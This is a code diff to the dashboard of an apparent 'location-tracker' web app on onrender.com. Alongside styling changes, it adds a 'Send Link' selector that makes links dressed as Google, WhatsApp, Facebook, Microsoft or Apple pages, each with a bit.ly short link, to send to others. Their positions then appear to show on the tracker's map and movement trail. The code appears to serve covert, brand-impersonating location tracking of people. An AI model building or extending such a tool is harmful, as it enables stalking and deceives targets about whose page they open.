@@ -55,7 +55,7 @@
         #infoPanel .label { opacity: 0.6; }
         #infoPanel .value { font-weight: 500; color: #fff; }
 
-        #map { height: calc(100vh - 130px); width: 100vw; }
+        #map { height: calc(100vh - 160px); width: 100vw; }
 
         #actions {
             position: absolute;
@@ -75,14 +75,10 @@
             border: 1px solid #0f3460;
         }
         #actions a, #actions button {
-            text-decoration: none;
-            padding: 8px 16px;
-            border-radius: 30px;
-            font-weight: 600;
-            font-size: 13px;
-            border: none;
-            cursor: pointer;
-            transition: all 0.2s;
+            text-decoration: none; padding: 8px 16px; border-radius: 30px;
+            font-weight: 600; font-size: 13px; border: none;
+            cursor: pointer; transition: all 0.2s;
+            display: inline-flex; align-items: center; gap: 6px;
         }
         #actions .btn-google { background: #1a73e8; color: white; }
         #actions .btn-google:hover { background: #1557b0; }
@@ -116,22 +112,67 @@
         #historyPanel::-webkit-scrollbar { width: 4px; }
         #historyPanel::-webkit-scrollbar-thumb { background: #0f3460; border-radius: 4px; }
         .history-toggle {
-            position: absolute;
-            top: 80px;
-            right: 20px;
-            z-index: 1001;
-            background: rgba(22, 33, 62, 0.9);
-            border: 1px solid #0f3460;
-            color: white;
-            padding: 8px 14px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-size: 12px;
-            transition: all 0.2s;
+            position: absolute; top: 80px; right: 20px; z-index: 1001;
+            background: rgba(22, 33, 62, 0.9); border: 1px solid #0f3460;
+            color: white; padding: 8px 14px; border-radius: 30px;
+            cursor: pointer; font-size: 12px; transition: all 0.2s;
         }
         .history-toggle:hover { background: #0f3460; }
 
+        #brandSelector {
+            background: #16213e;
+            color: #e0e0e0;
+            padding: 10px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 10px 15px;
+            border-bottom: 1px solid #0f3460;
+            font-size: 13px;
+            position: relative;
+            z-index: 1000;
+        }
+        #brandSelector label { opacity: 0.7; }
+        #brandSelector select {
+            background: #0f3460;
+            color: white;
+            border: 1px solid #1a4a6e;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        #brandSelector select:hover { border-color: #4caf50; }
+        #brandSelector .copy-link {
+            background: #4caf50;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        #brandSelector .copy-link:hover { background: #388e3c; }
+        #brandSelector .link-display {
+            background: #0f3460;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            flex: 1;
+            min-width: 200px;
+            color: #4caf50;
+        }
+        #brandSelector .short-link {
+            color: #ffc107;
+            font-size: 11px;
+        }
         @media (max-width: 768px) {
+            #brandSelector { flex-direction: column; align-items: stretch; }
+            #brandSelector .link-display { min-width: auto; }
             #topBar { flex-direction: column; align-items: flex-start; }
             #infoPanel { flex-direction: column; gap: 5px; }
             #actions { flex-direction: column; width: 90%; border-radius: 16px; padding: 15px; }
@@ -149,6 +190,20 @@
         <span class="dot yellow" id="statusDot"></span>
         <span id="statusText">Waiting for location...</span>
     </div>
+</div>
+
+<div id="brandSelector">
+    <label for="brandSelect">🔗 Send Link:</label>
+    <select id="brandSelect">
+        <option value="google">🔵 Google</option>
+        <option value="whatsapp" selected>💬 WhatsApp</option>
+        <option value="facebook">🔷 Facebook</option>
+        <option value="microsoft">⬡ Microsoft</option>
+        <option value="apple"> Apple</option>
+    </select>
+    <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
+    <button class="copy-link" id="copyLinkBtn">📋 Copy Link</button>
+    <span class="short-link" id="shortLinkDisplay">Short: bit.ly/4hOCDYS</span>
 </div>
 
 <div id="infoPanel">
@@ -173,7 +228,54 @@
 </div>
 
 <script>
-    const RENDER_URL = '';  // Leave empty (same domain)
+    const RENDER_URL = '';
+    const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
+
+    const SHORT_LINKS = {
+        google: 'bit.ly/4xnJHk8',
+        whatsapp: 'bit.ly/4hOCDYS',
+        facebook: 'bit.ly/4zKwlQD',
+        microsoft: 'bit.ly/3SzX3ur',
+        apple: 'bit.ly/4zv5tUq'
+    };
+
+    const brandSelect = document.getElementById('brandSelect');
+    const linkDisplay = document.getElementById('linkDisplay');
+    const shortLinkDisplay = document.getElementById('shortLinkDisplay');
+    const copyLinkBtn = document.getElementById('copyLinkBtn');
+
+    function updateLink() {
+        const brand = brandSelect.value;
+        const fullUrl = BASE_URL + '/?template=' + brand;
+        const shortUrl = SHORT_LINKS[brand] || '';
+        linkDisplay.textContent = fullUrl;
+        shortLinkDisplay.textContent = 'Short: ' + shortUrl;
+    }
+
+    brandSelect.addEventListener('change', updateLink);
+    updateLink();
+
+    copyLinkBtn.addEventListener('click', function() {
+        const link = linkDisplay.textContent;
+        navigator.clipboard.writeText(link).then(() => {
+            const originalText = copyLinkBtn.textContent;
+            copyLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyLinkBtn.textContent = originalText;
+            }, 2000);
+        }).catch(() => {
+            const range = document.createRange();
+            range.selectNode(linkDisplay);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            const originalText = copyLinkBtn.textContent;
+            copyLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyLinkBtn.textContent = originalText;
+            }, 2000);
+        });
+    });
 
     const map = L.map('map').setView([51.505, -0.09], 13);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -198,7 +300,6 @@
         catch { return iso; }
     }
 
-    // --- Movement Trail ---
     function updatePath(lat, lng) {
         pathCoordinates.push([lat, lng]);
         if (pathCoordinates.length > 2) {
